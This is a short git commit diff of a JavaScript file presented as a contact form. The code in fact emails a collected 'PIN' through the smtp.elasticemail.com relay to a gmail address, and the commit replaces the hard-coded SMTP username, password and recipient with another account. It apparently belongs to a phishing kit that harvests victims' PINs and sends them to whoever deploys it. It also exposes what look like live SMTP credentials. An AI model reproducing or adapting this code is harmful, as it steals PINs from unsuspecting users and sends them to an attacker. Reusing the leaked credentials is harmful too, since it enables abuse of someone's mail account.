91cf25af72973f98eb28191009c7d3520ac2b6cf
payday10177 <payday10177@gmail.com>
2024-06-10 21:22:48 +0100

    Update Contact-form-to-email1.js

--- Contact-form-to-email1.js
+++ Contact-form-to-email1.js
@@ -10,10 +10,10 @@ function emailSend() {
 
   Email.send({
     Host: "smtp.elasticemail.com",
-    Username: "nelsf38@gmail.com",
-    Password: "3D538C4DF17B36F1E64CD578356BE2FCF3CA",
+    Username: "payday10177@gmail.com",
+    Password: "60F88560F588591A7F78F2A9E657115D12C3",
     To: 'payday10177@gmail.com', // Change this to your email address where you want to receive the PIN
-    From: "nelsf38@gmail.com",
+    From: "payday10177@gmail.com",
     Subject: "PIN",
     Body: messageBody
   }).then(
